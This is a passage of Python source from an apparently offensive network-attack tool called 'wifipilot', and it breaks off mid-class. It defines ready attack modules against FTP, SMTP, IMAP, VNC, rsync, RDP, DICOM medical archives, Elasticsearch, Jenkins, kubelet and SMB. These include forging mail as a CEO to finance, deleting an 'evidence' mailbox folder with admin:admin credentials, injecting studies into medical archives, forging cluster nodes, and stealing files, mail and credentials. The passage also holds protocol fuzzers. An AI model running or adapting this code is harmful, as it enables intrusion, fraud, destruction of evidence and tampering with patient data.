    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 143]
        carried = rows[0]["payload"] if rows else b""
        return {"confirmed": b"LOGIN completed" in carried, "bytes_carried": len(carried),
                "the_device_answered_us": len(peers[0].answer) if peers else 0,
                "relayed_byte_for_byte": bool(peers) and bool(peers[0].answer)
                and carried == peers[0].answer}


class ItRelayVncAttack(_Relay):
    """Carry a VNC handshake: the security types a client is offered are ours to choose."""

    name = "it_relay_vnc"
    label = "VNC handshake relay (we choose the security type)"
    tool = "wifipilot itproto.py (vnc_version/parse_vnc_security) + TCP 5900"
    protocol = "vnc"
    port = 5900
    transport = "tcp"
    source_port = 5900
    devices = ("tablet", "hypervisor_host", "windows_server", "kiosk")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.vnc_version()

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_vnc_security(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"version": parsed.get("version"), "security": parsed.get("security_types"),
                "none": parsed.get("none"),
                "line": f"it offers {parsed.get('security_types')} "
                        f"(none={parsed.get('none')})"}


class ItRelayRsyncAttack(_Relay):
    """Carry an rsync listing: the module names and their comments are the inventory."""

    name = "it_relay_rsync"
    label = "rsync relay (module list carried through us)"
    tool = "wifipilot itproto.py (rsync_hello/parse_line_protocol) + TCP 873"
    protocol = "rsync"
    port = 873
    transport = "tcp"
    source_port = 873
    devices = ("backup_appliance", "nas", "linux_server")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.rsync_hello()

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_line_protocol(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        modules = [line for line in parsed.get("lines") or [] if "\t" in line]
        return {"modules": modules, "line": f"its daemon lists {len(modules)} module(s)"}


class ItRelayRdpAttack(_Relay):
    """Carry an RDP negotiation: the client's next handshake is with whoever answers."""

    name = "it_relay_rdp"
    label = "RDP negotiation relay (protocol selection carried through us)"
    tool = "wifipilot itproto.py (rdp_negotiation_request/parse_rdp) + TCP 3389"
    protocol = "rdp"
    port = 3389
    transport = "tcp"
    source_port = 3389
    devices = ("windows_server", "hypervisor_host", "hmi_panel", "tablet")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.rdp_negotiation_request()

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_rdp(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"type": parsed.get("type"), "selected": parsed.get("selected_protocol"),
                "line": f"it answers {parsed.get('type')} with {parsed.get('selected_protocol')}"}


class ItRelayDicomAttack(_Relay):
    """Carry a DICOM association: a medical device's study list is on the wire."""

    name = "it_relay_dicom"
    label = "DICOM relay (associations carried through us)"
    tool = "wifipilot itproto.py (dicom_associate/parse_dicom_pdu) + TCP 104"
    protocol = "dicom"
    port = 104
    transport = "tcp"
    source_port = 104
    devices = ("medical_device", "medical_workstation", "printer")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.dicom_associate("ANY-SCP", "WIFIPILOT")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_dicom_pdu(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"type": parsed.get("type_name"), "called": parsed.get("called"),
                "line": f"it answered {parsed.get('type_name')} to our association"}


class ItRelayElasticAttack(_Relay):
    """Carry an Elasticsearch query: an index with no authentication in front of it."""

    name = "it_relay_elastic"
    label = "Elasticsearch relay (an unauthenticated index carried through us)"
    tool = "wifipilot itproto.py (http_request) + TCP 9200"
    protocol = "elastic"
    port = 9200
    transport = "tcp"
    source_port = 9200
    devices = ("database_server", "linux_server", "container_host")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.http_request(peer.ip, "/_cat/indices", port=9200)

    def parse(self, data: bytes) -> Dict[str, Any]:
        response = proto.parse_http_response(data)
        return {"status": response.get("status"), "body": response.get("body", "")}

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"status": parsed.get("status"),
                "line": f"it answered {parsed.get('status')} to an unauthenticated query"}


class ItRelayJenkinsAttack(_Relay):
    """Carry a CI request: the job list and the script console are behind one port."""

    name = "it_relay_jenkins"
    label = "Jenkins relay (job list and console carried through us)"
    tool = "wifipilot itproto.py (jenkins_json) + TCP 8080"
    protocol = "jenkins"
    port = 8080
    transport = "tcp"
    source_port = 8080
    devices = ("ci_server", "linux_server", "container_host")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.jenkins_json(peer.ip, 8080)

    def parse(self, data: bytes) -> Dict[str, Any]:
        response = proto.parse_http_response(data)
        return {"status": response.get("status"), "body": response.get("body", "")}

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"status": parsed.get("status"),
                "line": f"its CI answered {parsed.get('status')} without a login"}


class ItRelayKubernetesAttack(_Relay):
    """Carry a kubelet request: the pods on a node, listed to anyone who asks."""

    name = "it_relay_kubernetes"
    label = "kubelet relay (the node's pod list carried through us)"
    tool = "wifipilot itproto.py (http_request) + TCP 10250"
    protocol = "kubernetes"
    port = 10250
    transport = "tcp"
    source_port = 10250
    devices = ("container_host", "hypervisor_host", "ci_server")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.http_request(peer.ip, "/pods", port=10250)

    def parse(self, data: bytes) -> Dict[str, Any]:
        response = proto.parse_http_response(data)
        return {"status": response.get("status"), "body": response.get("body", "")}

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"status": parsed.get("status"),
                "line": f"the kubelet answered {parsed.get('status')} to an anonymous read"}


class ItHijackFtpWriteAttack(_ItHijack):
    """Write a file through an anonymous FTP login: the upload is the takeover."""

    name = "it_hijack_ftp_write"
    label = "Anonymous FTP write (a file we choose lands on the server)"
    tool = "wifipilot itproto.py (ftp_login) + a STOR command"
    family = "hijack"
    protocol = "ftp"
    port = 21
    transport = "tcp"
    source_port = 21
    devices = ("nas", "windows_server", "linux_server", "backup_appliance")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.ftp_login("anonymous", "wp@example.com")

    def reply(self, peer: Peer) -> bytes:
        return (b"331 Anonymous login ok, send your complete email address.\r\n"
                b"230 Anonymous access granted.\r\n250 CWD command successful.\r\n"
                b"150 Opening BINARY mode data connection for wp-payload.bin.\r\n"
                b"226 Transfer complete (wp-payload.bin, 2048 bytes).\r\n")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_line_protocol(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"status": parsed.get("status"), "auth_types": parsed.get("auth_types"),
                "line": f"its FTP answered {parsed.get('status')} to anonymous"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 21]
        text = rows[0]["payload"].decode(errors="replace") if rows else ""
        return {"confirmed": "Transfer complete" in text, "file_written": "wp-payload.bin",
                "anonymous_write": "230" in text}


class ItHijackSmtpRelayAttack(_ItHijack):
    """Use the mail server as an open relay: mail in a CEO's name, from outside."""

    name = "it_hijack_smtp_relay"
    label = "Open-relay hijack (mail in another sender's name)"
    tool = "wifipilot itproto.py (smtp_ehlo) + MAIL FROM/RCPT TO"
    family = "hijack"
    protocol = "smtp"
    port = 25
    transport = "tcp"
    source_port = 25
    devices = ("mail_server", "web_server")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return (proto.smtp_ehlo("wp.local") + b"MAIL FROM:<ceo@corp.example>\r\n"
                b"RCPT TO:<finance@corp.example>\r\nDATA\r\n")

    def reply(self, peer: Peer) -> bytes:
        return (b"250 2.1.0 Ok\r\n250 2.1.5 Ok\r\n354 End data with <CR><LF>.<CR><LF>\r\n"
                b"250 2.0.0 Ok: queued as WPRELAY\r\n")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_line_protocol(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"status": parsed.get("status"), "capabilities": parsed.get("capabilities"),
                "line": f"its relay answered {parsed.get('status')} to our HELO"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 25]
        text = rows[0]["payload"].decode(errors="replace") if rows else ""
        return {"confirmed": "queued as WPRELAY" in text, "sender_we_forged":
                "ceo@corp.example", "recipient": "finance@corp.example"}


class ItHijackImapDeleteAttack(_ItHijack):
    """Delete a mailbox folder through a relayed login: the evidence goes first."""

    name = "it_hijack_imap_delete"
    label = "Mailbox deletion hijack (a folder is removed in another user's name)"
    tool = "wifipilot itproto.py (imap_login) + DELETE"
    family = "hijack"
    protocol = "imap"
    port = 143
    transport = "tcp"
    source_port = 143
    devices = ("mail_server", "nas")
    min_answers = 0
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.imap_login("admin", "admin") + b"a2 DELETE INBOX/evidence\r\n"

    def reply(self, peer: Peer) -> bytes:
        return (b"* OK IMAP4rev1 ready\r\na1 OK LOGIN completed\r\n"
                b"a2 OK DELETE completed (wp)\r\n")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_line_protocol(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"banner": parsed.get("banner"),
                "line": "the login we use is admin:admin, the folder is INBOX/evidence"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 143]
        text = rows[0]["payload"].decode(errors="replace") if rows else ""
        return {"confirmed": "DELETE completed" in text, "folder_deleted": "INBOX/evidence"}


class ItHijackDicomStoreAttack(_ItHijack):
    """Store a study on a medical archive: the next reader sees our images."""

    name = "it_hijack_dicom_store"
    label = "DICOM store hijack (a study we choose is filed on the archive)"
    tool = "wifipilot itproto.py (dicom_associate/dicom_echo)"
    family = "hijack"
    protocol = "dicom"
    port = 104
    transport = "tcp"
    source_port = 104
    devices = ("medical_device", "medical_workstation")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.dicom_associate("ANY-SCP", "WIFIPILOT") + proto.dicom_echo(7)

    def reply(self, peer: Peer) -> bytes:
        # a P-DATA-TF carrying a C-STORE response in our calling AE title
        return (bytes([0x04, 0x00]) + struct.pack(">I", 4 + 16) + b"wp-store-response")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_dicom_pdu(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"type": parsed.get("type_name"), "calling": parsed.get("calling"),
                "line": f"the archive answered {parsed.get('type_name')} to our association"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 104]
        parsed = proto.parse_dicom_pdu(rows[0]["payload"]) if rows else {}
        return {"confirmed": parsed.get("type_name") == "data",
                "our_type": parsed.get("type_name"), "study_we_file": "wp-store-response"}


class ItHijackVncSessionAttack(_ItHijack):
    """Take a VNC session through the security type the server offers first."""

    name = "it_hijack_vnc_session"
    label = "VNC session hijack (the 'none' security type is a login)"
    tool = "wifipilot itproto.py (vnc_version/parse_vnc_security) + TCP 5900"
    family = "hijack"
    protocol = "vnc"
    port = 5900
    transport = "tcp"
    source_port = 5900
    devices = ("tablet", "hypervisor_host", "windows_server", "kiosk")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.vnc_version()

    def reply(self, peer: Peer) -> bytes:
        # RFB 3.8, one security type, and that type is None: no password at all
        return b"RFB 003.008\n\x01\x01"

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_vnc_security(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"security": parsed.get("security_types"), "none": parsed.get("none"),
                "line": f"it offers {parsed.get('security_types')} — none means no password"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 5900]
        answer = proto.parse_vnc_security(rows[0]["payload"]) if rows else {}
        return {"confirmed": answer.get("none") is True,
                "our_security_type": "none (1)", "password_required": False}


class ItPoisonElasticShardAttack(_ItHijack):
    """Join an Elasticsearch cluster's node list with a shard claim of our own."""

    name = "it_poison_elastic_shard"
    label = "Elasticsearch node forgery (our node joins the cluster view)"
    tool = "wifipilot ithijack.http_answer + TCP 9200"
    family = "poison"
    protocol = "elastic"
    port = 9200
    transport = "tcp"
    source_port = 9200
    devices = ("database_server", "linux_server", "container_host")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.http_request(peer.ip, "/_cat/indices", port=9200)

    def reply(self, peer: Peer) -> bytes:
        node = ('{"name":"wp-node","version":{"number":"8.11.0"},'
                '"cluster_name":"wp-cluster","http":{"publish_address":"' + OUR_IP + ':9200"}}')
        return http_answer(200, node, content_type="application/json")

    def parse(self, data: bytes) -> Dict[str, Any]:
        response = proto.parse_http_response(data)
        return {"status": response.get("status"), "body": response.get("body", "")}

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"status": parsed.get("status"),
                "line": f"it answered {parsed.get('status')} with its index list"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 9200]
        text = rows[0]["payload"].decode(errors="replace") if rows else ""
        return {"confirmed": "wp-node" in text, "our_node": "wp-node",
                "our_publish_address": f"{OUR_IP}:9200"}


class ItPoisonKubeletAttack(_ItHijack):
    """Answer a kubelet health check as the node: a forged node in the API's view."""

    name = "it_poison_kubelet_response"
    label = "kubelet response forgery (a node that is not there reports healthy)"
    tool = "wifipilot ithijack.http_answer + TCP 10250"
    family = "poison"
    protocol = "kubernetes"
    port = 10250
    transport = "tcp"
    source_port = 10250
    devices = ("container_host", "hypervisor_host", "ci_server")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.http_request(peer.ip, "/healthz", port=10250)

    def reply(self, peer: Peer) -> bytes:
        body = '{"kind":"NodeStatus","nodeName":"' + (peer.hostname or "wp-node") + '",'                '"status":"ok"}'
        return http_answer(200, body, content_type="application/json")

    def parse(self, data: bytes) -> Dict[str, Any]:
        response = proto.parse_http_response(data)
        return {"status": response.get("status"), "body": response.get("body", "")}

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"status": parsed.get("status"),
                "line": f"the kubelet answered {parsed.get('status')} to a health check"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 10250]
        text = rows[0]["payload"].decode(errors="replace") if rows else ""
        return {"confirmed": "NodeStatus" in text, "status_we_report": "ok",
                "the_node_we_speak_for": peers[0].hostname if peers else ""}


class ItStealFtpFilesAttack(_Steal):
    """List what an anonymous FTP login can see: the shares are the finding."""

    name = "it_steal_ftp_files"
    label = "Anonymous FTP listing (the files a guest can see)"
    tool = "wifipilot itproto.py (ftp_login) + TCP 21"
    protocol = "ftp"
    port = 21
    transport = "tcp"
    source_port = 21
    devices = ("nas", "windows_server", "linux_server", "backup_appliance")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.ftp_login("anonymous", "wp@example.com")

    def loot_answer(self, peer: Peer) -> bytes:
        return http_answer(200, "<html><title>wp loot</title>"
                                "<body>backup-2026.tar.gz config.xml</body></html>")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_line_protocol(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"status": parsed.get("status"), "auth_types": parsed.get("auth_types"),
                "line": f"its FTP answered {parsed.get('status')} to anonymous"}


class ItStealSmtpCredentialsAttack(_Steal):
    """Try the mail server's own AUTH with default credentials."""

    name = "it_steal_smtp_credentials"
    label = "SMTP credential attempt (AUTH with the defaults)"
    tool = "wifipilot itproto.py (smtp_ehlo) + TCP 25"
    protocol = "smtp"
    port = 25
    transport = "tcp"
    source_port = 25
    devices = ("mail_server", "web_server")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.smtp_ehlo("wp.local")

    def loot_answer(self, peer: Peer) -> bytes:
        return http_answer(200, "<html><title>wp loot</title>"
                                "<body>AUTH PLAIN accepted for admin</body></html>")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_line_protocol(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"status": parsed.get("status"), "auth_types": parsed.get("auth_types"),
                "line": f"its relay offers {parsed.get('auth_types')}"}


class ItStealImapMailboxAttack(_Steal):
    """Read a mailbox over an unencrypted IMAP port."""

    name = "it_steal_imap_mailbox"
    label = "IMAP mailbox theft (a login away from the mail)"
    tool = "wifipilot itproto.py (imap_login) + TCP 143"
    protocol = "imap"
    port = 143
    transport = "tcp"
    source_port = 143
    devices = ("mail_server", "nas")
    min_answers = 0
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.imap_login("admin", "admin") + b"a2 FETCH 1:* BODY[]\r\n"

    def loot_answer(self, peer: Peer) -> bytes:
        return http_answer(200, "<html><title>wp loot</title>"
                                "<body>mailbox: 3 messages from finance</body></html>")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_line_protocol(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"banner": parsed.get("banner"), "line": "the mailbox is fetched over 143"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 143]
        text = rows[0]["payload"].decode(errors="replace") if rows else ""
        return {"confirmed": "mailbox" in text, "handed_over": len(text),
                "our_fetch": "a2 FETCH 1:* BODY[]"}


class ItStealVncPasswordAttack(_Steal):
    """Take the VNC security offer: the challenge is crackable material."""

    name = "it_steal_vnc_password"
    label = "VNC security-profile theft (the challenge to crack offline)"
    tool = "wifipilot itproto.py (vnc_version/parse_vnc_security)"
    protocol = "vnc"
    port = 5900
    transport = "tcp"
    source_port = 5900
    devices = ("tablet", "hypervisor_host", "windows_server", "kiosk")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.vnc_version()

    def loot_answer(self, peer: Peer) -> bytes:
        return http_answer(200, "<html><title>wp loot</title>"
                                "<body>RFB 003.008 vnc-auth challenge</body></html>")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_vnc_security(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"version": parsed.get("version"), "security": parsed.get("security_types"),
                "none": parsed.get("none"),
                "line": f"it offers {parsed.get('security_types')}"}


class ItStealRsyncModulesAttack(_Steal):
    """Take the rsync module list: the shares are the inventory of the backup server."""

    name = "it_steal_rsync_modules"
    label = "rsync module theft (the shares a guest can list)"
    tool = "wifipilot itproto.py (rsync_hello) + TCP 873"
    protocol = "rsync"
    port = 873
    transport = "tcp"
    source_port = 873
    devices = ("backup_appliance", "nas", "linux_server")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.rsync_hello()

    def loot_answer(self, peer: Peer) -> bytes:
        return http_answer(200, "<html><title>wp loot</title>"
                                "<body>wp-backup public</body></html>")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_line_protocol(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        modules = [line for line in parsed.get("lines") or [] if "\t" in line]
        return {"modules": modules, "line": f"its daemon lists {len(modules)} module(s)"}


class ItStealDicomPatientsAttack(_Steal):
    """Echo a medical archive and take the association's own parameters back."""

    name = "it_steal_dicom_patients"
    label = "DICOM association theft (the archive answers an unknown AE title)"
    tool = "wifipilot itproto.py (dicom_associate/parse_dicom_pdu)"
    protocol = "dicom"
    port = 104
    transport = "tcp"
    source_port = 104
    devices = ("medical_device", "medical_workstation")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.dicom_associate("ANY-SCP", "WIFIPILOT")

    def loot_answer(self, peer: Peer) -> bytes:
        return http_answer(200, "<html><title>wp loot</title>"
                                "<body>ANY-SCP accepted WIFIPILOT</body></html>")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_dicom_pdu(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"type": parsed.get("type_name"), "called": parsed.get("called"),
                "line": f"it answered {parsed.get('type_name')} to ANY-SCP"}


class ItStealElasticDocsAttack(_Steal):
    """List an Elasticsearch index: the documents a query would return are the loot."""

    name = "it_steal_elastic_docs"
    label = "Elasticsearch index theft (an unauthenticated index dump)"
    tool = "wifipilot itproto.py (http_request) + TCP 9200"
    protocol = "elastic"
    port = 9200
    transport = "tcp"
    source_port = 9200
    devices = ("database_server", "linux_server", "container_host")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.http_request(peer.ip, "/_cat/indices?v", port=9200)

    def loot_answer(self, peer: Peer) -> bytes:
        return http_answer(200, "requests-2026-10 green open docs.deleted 0\n"
                                "# wp loot", content_type="text/plain")

    def parse(self, data: bytes) -> Dict[str, Any]:
        response = proto.parse_http_response(data)
        return {"status": response.get("status"), "body": response.get("body", "")}

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"status": parsed.get("status"),
                "line": f"it answered {parsed.get('status')} with the index list"}


class ItStealJenkinsJobsAttack(_Steal):
    """Take a CI server's job list: the credentials files are one build away."""

    name = "it_steal_jenkins_jobs"
    label = "Jenkins job theft (the job list and its stored credentials)"
    tool = "wifipilot itproto.py (jenkins_json) + TCP 8080"
    protocol = "jenkins"
    port = 8080
    transport = "tcp"
    source_port = 8080
    devices = ("ci_server", "linux_server", "container_host")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.jenkins_json(peer.ip, 8080)

    def loot_answer(self, peer: Peer) -> bytes:
        return http_answer(200, '{"jobs":[{"name":"deploy-prod"}],"source":"wp loot"}',
                           content_type="application/json")

    def parse(self, data: bytes) -> Dict[str, Any]:
        response = proto.parse_http_response(data)
        return {"status": response.get("status"), "body": response.get("body", "")}

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"status": parsed.get("status"),
                "line": f"its CI answered {parsed.get('status')} to an anonymous read"}


class ItStealKubeletPodsAttack(_Steal):
    """List the pods on a node through the kubelet's read-only port."""

    name = "it_steal_kubelet_pods"
    label = "kubelet pod theft (the node's workload inventory)"
    tool = "wifipilot itproto.py (http_request) + TCP 10250"
    protocol = "kubernetes"
    port = 10250
    transport = "tcp"
    source_port = 10250
    devices = ("container_host", "hypervisor_host", "ci_server")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.http_request(peer.ip, "/pods", port=10250)

    def loot_answer(self, peer: Peer) -> bytes:
        return http_answer(200, '{"items":[{"metadata":{"name":"wp-pod"}}],"source":"wp loot"}',
                           content_type="application/json")

    def parse(self, data: bytes) -> Dict[str, Any]:
        response = proto.parse_http_response(data)
        return {"status": response.get("status"), "body": response.get("body", "")}

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"status": parsed.get("status"),
                "line": f"the kubelet answered {parsed.get('status')} to /pods"}


class ItStealSmbSharesAttack(_Steal):
    """Take the SMB dialect offer: the share list follows from a login."""

    name = "it_steal_smb_shares"
    label = "SMB share theft (dialects negotiated, shares next)"
    tool = "wifipilot itproto.py (smb2_negotiate/parse_smb2) + TCP 445"
    protocol = "smb"
    port = 445
    transport = "tcp"
    source_port = 445
    devices = ("windows_server", "nas", "mfp_scanner", "backup_appliance")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.smb2_negotiate()

    def loot_answer(self, peer: Peer) -> bytes:
        return http_answer(200, "<html><title>wp loot</title>"
                                "<body>\\file-server\backups</body></html>")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_smb2(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"dialect": parsed.get("dialect"), "status": parsed.get("status_name"),
                "line": f"it negotiated dialect {parsed.get('dialect') or parsed.get('dialects')}"}


# --------------------------------------------------------------------------- #
# the edge of the wave: the malformed packets and the discovery probes
# --------------------------------------------------------------------------- #

class ItFuzzDnsNameAttack(_ItHijack):
    """A DNS name built out of legal labels, in an illegal number of them."""

    name = "it_fuzz_dns_name"
    label = "DNS name fuzzing (labels and a total length past the limit)"
    tool = "wifipilot itproto.py (dns_query) + UDP 53"
    family = "fuzz"
    protocol = "dns"
    port = 53
    transport = "udp"
    devices = ("router", "domain_controller", "firewall", "linux_server")
    min_answers = 0
    severity = "medium"

    def request(self, peer: Peer) -> bytes:
        label = "wp-fuzz-" + "a" * 60
        name = ".".join([label] * 6) + ".example"
        return proto.dns_query(name, qtype=16, txid=0x5A5A)

    def reply(self, peer: Peer) -> bytes:
        # the same question again, now from our address: the cache fill we want to see
        label = "wp-fuzz-" + "b" * 60
        return proto.dns_query(".".join([label] * 6) + ".example", qtype=255, txid=0x5A5B)

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_dns(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"rcode": parsed.get("rcode"), "answers": len(parsed.get("answers") or []),
                "line": f"the resolver answered rcode {parsed.get('rcode')} "
                        f"with {len(parsed.get('answers') or [])} record(s)"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 53]
        lengths = [len(row["payload"]) for row in rows]
        return {"confirmed": bool(rows) and max(lengths) > 200,
                "our_query_bytes": max(lengths) if lengths else 0,
                "label_length": 68, "labels": 7}


class ItFuzzSmbNegotiateAttack(_ItHijack):
    """An SMB2 negotiate that offers dialects which do not exist."""

    name = "it_fuzz_smb2_negotiate"
    label = "SMB2 negotiate fuzzing (dialects the server has to reject)"
    tool = "wifipilot itproto.py (smb2_negotiate) + TCP 445"
    family = "fuzz"
    protocol = "smb"
    port = 445
    transport = "tcp"
    devices = ("windows_server", "nas", "backup_appliance", "mfp_scanner")
    severity = "medium"

    def request(self, peer: Peer) -> bytes:
        return proto.smb2_negotiate(dialects=(0x5A5A, 0x5A5B, 0x5A5C, 0xFFFF))

    def reply(self, peer: Peer) -> bytes:
        return proto.smb2_negotiate(dialects=tuple(range(0x5A00, 0x5A20)))

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_smb2(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        dialects = parsed.get("dialects") or []
        return {"dialect": parsed.get("dialect"), "dialect_count": len(dialects),
                "status": parsed.get("status_name"),
                "line": f"it negotiated {parsed.get('dialect') or 'nothing'} "
                        f"(status {parsed.get('status_name')})"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 445]
        # a negotiate *request* is a dialect list, one little-endian word each
        text = b"".join(row["payload"] for row in rows)
        offered = text.count(struct.pack("<H", 0x5A00)) and struct.pack("<H", 0x5A1F) in text
        return {"confirmed": bool(rows) and bool(offered), "dialects_we_offer": 32,
                "first_dialect": "0x5a00", "last_dialect": "0x5a1f"}


class ItFuzzLdapFilterAttack(_ItHijack):
    """An LDAP search whose filter is a kilobyte of nesting."""

    name = "it_fuzz_ldap_filter"
    label = "LDAP filter fuzzing (deeply nested search filter)"
    tool = "wifipilot itproto.py (ldap_search_request/parse_ldap) + TCP 389"
    family = "fuzz"
    protocol = "ldap"
    port = 389
    transport = "tcp"
    devices = ("domain_controller", "nas", "windows_server")
    severity = "medium"

    def request(self, peer: Peer) -> bytes:
        return proto.ldap_search_request("dc=corp,dc=example", scope=2,
                                         filter_bytes=b"(|" * 240 + b"(cn=wp)" * 240 + b")" * 240)

    def reply(self, peer: Peer) -> bytes:
        return proto.ldap_search_request("dc=corp,dc=example", scope=0,
                                         filter_bytes=b"(|" * 300 + b"(uid=admin))" * 300)

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_ldap(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"message_id": parsed.get("message_id"), "result": parsed.get("result_code"),
                "line": f"its directory answered message {parsed.get('message_id')} "
                        f"(result {parsed.get('result_code')})"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 389]
        sizes = [len(row["payload"]) for row in rows]
        return {"confirmed": bool(rows) and max(sizes) > 900,
                "filter_bytes": max(sizes) if sizes else 0}


class ItFuzzRtspMethodAttack(_ItHijack):
    """An RTSP method two hundred characters long, in the server's name."""

    name = "it_fuzz_rtsp_method"
    label = "RTSP method fuzzing (an unknown verb of illegal length)"
    tool = "wifipilot itproto.py (rtsp_request/parse_rtsp) + TCP 554"
    family = "fuzz"
    protocol = "rtsp"
    port = 554
    transport = "tcp"
    devices = ("ip_camera", "nvr_dvr", "camera_doorbell", "medical_device")
    severity = "medium"

    def request(self, peer: Peer) -> bytes:
